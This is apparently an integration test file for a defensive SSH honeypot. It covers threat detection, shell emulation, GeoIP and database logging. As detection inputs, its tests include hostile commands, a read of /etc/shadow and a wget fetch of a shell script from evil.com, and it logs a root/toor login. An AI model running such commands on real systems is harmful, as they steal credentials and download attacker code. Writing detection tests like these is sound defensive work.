"""
integration_test.py - Tests the honeypot end-to-end without network:
  1. All modules import cleanly
  2. VFS build works
  3. Threat engine detects patterns correctly  
  4. Pipe dispatch works (grep, head, tail, wc, sort)
  5. GeoIP circuit breaker works (private IPs)
  6. Database WAL mode is active
  7. Settings constants are correct
  8. _send() truncation works
"""
import sys, io, time, traceback
sys.path.insert(0, '.')

PASS = []
FAIL = []

def test(name, fn):
    try:
        fn()
        PASS.append(name)
        print(f"  PASS  {name}")
    except Exception as e:
        FAIL.append(name)
        print(f"  FAIL  {name}: {e}")
        traceback.print_exc()

# ── 1. Imports ────────────────────────────────────────────────────────────────
def t_imports():
    import config.settings
    import core.virtual_fs
    import core.threat_engine
    import core.command_engine
    import core.ssh_server
    import database.db
    import web.app
test("All modules import", t_imports)

# ── 2. Settings constants ─────────────────────────────────────────────────────
def t_settings():
    from config.settings import (
        get_timestamp, MAX_COMMAND_LENGTH, MAX_ARGS,
        MAX_OUTPUT_SIZE, NANO_MAX_SIZE, SESSION_TIMEOUT, TIMEZONE
    )
    ts = get_timestamp()
    assert "T" in ts and "+" in ts, f"Bad timestamp: {ts}"
    assert MAX_COMMAND_LENGTH == 4096
    assert SESSION_TIMEOUT == 3600
    assert MAX_OUTPUT_SIZE == 1024*1024
    assert NANO_MAX_SIZE == 10*1024*1024
test("Settings constants", t_settings)

# ── 3. VFS ────────────────────────────────────────────────────────────────────
def t_vfs():
    from core.virtual_fs import build_vfs
    vfs, fc = build_vfs()
    assert "/" in vfs
    assert "/etc" in vfs
    assert "/home/corpuser" in vfs
    assert "/home/corpuser/secret.txt" in fc
    assert "DB_PASSWORD" in fc["/home/corpuser/secret.txt"]
test("Virtual filesystem", t_vfs)

# ── 4. Threat patterns ────────────────────────────────────────────────────────
def t_threats():
    from core.threat_engine import analyse_command
    # cat /etc/shadow should trigger CRED_HUNT
    alerts = analyse_command("1.2.3.4", "cat /etc/shadow", "corpuser")
    assert len(alerts) > 0, "No alert for shadow file"
    cats = {a["category"] for a in alerts}
    assert any(c in cats for c in ("CRED_HUNT", "RECON", "PRIVESC")), f"Wrong categories: {cats}"
    # wget should trigger EXFIL
    alerts2 = analyse_command("1.2.3.4", "wget http://evil.com/shell.sh", "corpuser")
    assert len(alerts2) > 0, "No alert for wget"
test("Threat detection", t_threats)

# ── 5. Pipe dispatch ──────────────────────────────────────────────────────────
def t_pipes():
    from core.command_engine import _pipe_dispatch
    data = "root:x:0:0:/root:/bin/bash\ncorpuser:x:1001:1001:/home/corpuser:/bin/bash\n"
    assert "root" in _pipe_dispatch("grep root", data)
    assert "corpuser" not in _pipe_dispatch("grep root", data)
    assert _pipe_dispatch("wc -l", data) == "2"
    assert _pipe_dispatch("head -1", data) == "root:x:0:0:/root:/bin/bash"
    assert _pipe_dispatch("tail -1", data).startswith("corpuser")
    sorted_out = _pipe_dispatch("sort", "banana\napple\ncherry")
    assert sorted_out.startswith("apple"), f"Sort failed: {sorted_out}"
    # grep -v invert
    out = _pipe_dispatch("grep -v root", data)
    assert "corpuser" in out and "root" not in out.split("\n")[0]
test("Pipe dispatch (grep/head/tail/wc/sort)", t_pipes)

# ── 6. GeoIP circuit breaker ─────────────────────────────────────────────────
def t_geoip():
    from core.threat_engine import geoip_lookup, _geo_failures, _GEO_MAX_FAILS
    # Private IP should return immediately without network call
    result = geoip_lookup("192.168.1.1")
    assert result["is_private"] == True
    assert result["country"] == "Local"
    # After 3 failures, should return fast without trying
    _geo_failures["10.20.30.40"] = _GEO_MAX_FAILS
    t0 = time.time()
    result = geoip_lookup("10.20.30.40")  # private, won't reach circuit breaker
    # Try with a fake public IP that's in the failure dict
    _geo_failures["5.5.5.5"] = _GEO_MAX_FAILS
    t0 = time.time()
    result2 = geoip_lookup("5.5.5.5")
    elapsed = time.time() - t0
    assert elapsed < 0.1, f"Circuit breaker too slow: {elapsed:.3f}s"
    print(f"    (circuit breaker responded in {elapsed*1000:.1f}ms)")
test("GeoIP circuit breaker", t_geoip)

# ── 7. Database WAL mode ──────────────────────────────────────────────────────
def t_database():
    import sqlite3, os, tempfile
    db_path = tempfile.mktemp(suffix=".db")
    try:
        from database.db import DatabaseManager
        dm = DatabaseManager(db_path)
        # Verify WAL mode
        mode = dm._conn.execute("PRAGMA journal_mode;").fetchone()[0]
        assert mode == "wal", f"Expected WAL, got: {mode}"
        # Verify CRUD
        dm.insert_connection("1.2.3.4", 54321)
        dm.insert_auth("1.2.3.4", "root", "toor", False)
        dm.insert_command("1.2.3.4", "root", "cat /etc/shadow")
        dm.insert_threat({
            "source_ip":"1.2.3.4","username":"root","category":"CRED_HUNT",
            "severity":"high","rule_id":"T1552","command":"cat /etc/shadow",
            "message":"Shadow file read"
        })
        top = dm.get_top_attackers(5)
        assert len(top) >= 1
        dm.close()
    finally:
        try: os.unlink(db_path)
        except: pass
test("Database (WAL + CRUD)", t_database)

# ── 8. Input validation constants ─────────────────────────────────────────────
def t_validation():
    from config.settings import MAX_COMMAND_LENGTH, NANO_MAX_SIZE
    # Simulate the check used in emulated_shell
    long_cmd = "A" * (MAX_COMMAND_LENGTH + 1)
    assert len(long_cmd) > MAX_COMMAND_LENGTH
    big_file = "X" * (NANO_MAX_SIZE + 1)
    assert len(big_file) > NANO_MAX_SIZE
test("Validation constants (length/size limits)", t_validation)

# ── 9. Env-var expansion ──────────────────────────────────────────────────────
def t_envvars():
    import re
    env = {"HOME": "/home/corpuser", "USER": "corpuser", "PATH": "/usr/bin:/bin"}
    def expand(s):
        def repl(m):
            name = m.group(1) or m.group(2)
            return env.get(name, "")
        return re.sub(r'\$\{(\w+)\}|\$(\w+)', repl, s)
    assert expand("cd $HOME") == "cd /home/corpuser"
    assert expand("echo ${USER}") == "echo corpuser"
    assert expand("echo $UNDEFINED") == "echo "
    assert expand("echo hello") == "echo hello"   # no vars
test("Env-var expansion", t_envvars)

# ── 10. Glob expansion ────────────────────────────────────────────────────────
def t_glob():
    import fnmatch
    vfs = {"/etc": ["passwd", "shadow", "hosts", "resolv.conf"]}
    def expand_glob(token, cwd):
        if not any(c in token for c in ("*", "?", "[")):
            return [token]
        base = cwd if not token.startswith("/") else token.rsplit("/", 1)[0] or "/"
        pat  = token if not token.startswith("/") else token.rsplit("/", 1)[1]
        entries = vfs.get(base, [])
        matched = [f"{base}/{e}" if base != "/" else f"/{e}"
                   for e in entries if fnmatch.fnmatch(e, pat)]
        return sorted(matched) if matched else [token]
    
    result = expand_glob("pass*", "/etc")
    assert "/etc/passwd" in result, f"Glob failed: {result}"
    result2 = expand_glob("*.conf", "/etc")
    assert "/etc/resolv.conf" in result2
    result3 = expand_glob("nomatch*", "/etc")
    assert result3 == ["nomatch*"]  # no match → return original
test("Glob wildcard expansion", t_glob)

# ── Summary ───────────────────────────────────────────────────────────────────
print()
print("=" * 50)
print(f"Results: {len(PASS)} PASS  |  {len(FAIL)} FAIL")
if FAIL:
    print("FAILED:", FAIL)
    sys.exit(1)
else:
    print("ALL TESTS PASSED [OK]")
